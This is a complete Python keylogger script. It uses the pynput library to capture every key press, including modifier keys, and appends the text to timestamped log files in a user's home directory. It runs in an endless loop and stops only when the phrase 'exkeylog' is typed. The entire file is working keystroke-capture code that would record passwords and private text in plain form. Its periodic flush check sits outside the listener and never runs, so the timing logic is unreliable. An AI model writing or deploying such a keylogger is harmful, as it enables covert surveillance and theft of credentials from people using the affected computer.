import datetime, time
from pynput.keyboard import Listener

LOG_BASE_FILE = "/home/suchi/.local/logs/"

def write_to_log(buffer, start):
    d = datetime.datetime.now().strftime('%y-%m-%d_%H-%M-%S')
    filename = LOG_BASE_FILE + 'keylogger_{}.txt'.format(d)

    buffer = start + " - " + d + "\n\n" + buffer + "\n\n"

    with open(filename, 'a') as f:
        f.write(buffer)


def key_listener():
    global BUFFER

    BUFFER = ''
    start = datetime.datetime.now().strftime('%y-%m-%d_%H-%M-%S')
    time0=time.time()

    def key_recorder(key):
        global BUFFER

        key = str(key)
        if key == 'Key.ctrl':
            BUFFER += '<CTRL>'
        elif key == 'Key.enter':
            BUFFER += '<ENTER>'
        elif key == 'Key.space':
            BUFFER += '<SPACE>'
        elif key == 'Key.backspace':
            BUFFER += '<BS>'
        elif key == 'Key.shift_r':
            BUFFER += '<SHIFT>'
        elif key == 'Key.shift':
            BUFFER += '<SHIFT>'
        elif key == 'Key.alt_r':
            BUFFER += '<ALT>'
        elif key == 'Key.alt':
            BUFFER += '<ALT>'
        elif key == 'Key.caps_lock':
            BUFFER += '<CL>'
        elif key == 'Key.tab':
            BUFFER += '<TAB>'
        elif key == 'Key.cmd':
            BUFFER += '<MOD>'
        elif key == '<65027>':
            BUFFER += ''
        else:
            BUFFER += key.replace("'", "")

        if "exkeylog" in BUFFER.lower():
            write_to_log(BUFFER, start)
            print("Exiting key logger.")
            exit(0)

    if time.time()-time0 > 6000:
        write_to_log(BUFFER, start)
        BUFFER = ''


    with Listener(on_press=key_recorder) as listener:
        listener.join()


while True:
    key_listener()
